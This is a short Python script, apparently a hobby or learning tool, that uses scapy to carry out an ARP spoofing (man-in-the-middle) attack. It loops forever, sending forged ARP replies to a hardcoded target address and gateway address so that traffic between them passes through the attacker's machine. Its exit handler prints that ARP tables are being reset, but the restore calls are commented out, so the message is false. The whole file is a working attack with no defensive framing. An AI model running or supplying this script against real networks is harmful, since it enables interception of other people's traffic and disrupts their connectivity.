#!/usr/bin/python3
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # print(len(answered_list))
    if len(answered_list) == 0:
        print("can find the ip: " + ip)
        return ("00:00:00:00:00:00")
    else:
        return (answered_list[0][1].hwsrc)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
# pdst = vicim IP   hwdst = victim MAC  psrc = router IP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.204.1"
gateway_ip = "192.168.204.2"

try:
    send_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        send_packets_count += 2
        print(" \r[+] Packets sent: " + str(send_packets_count), end=""),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...."
        "Resetting ARP tables....Please wait.\n")
    # restore(target_ip, gateway_ip)
    # restore(gateway_ip, target_ip)

print("================finish================")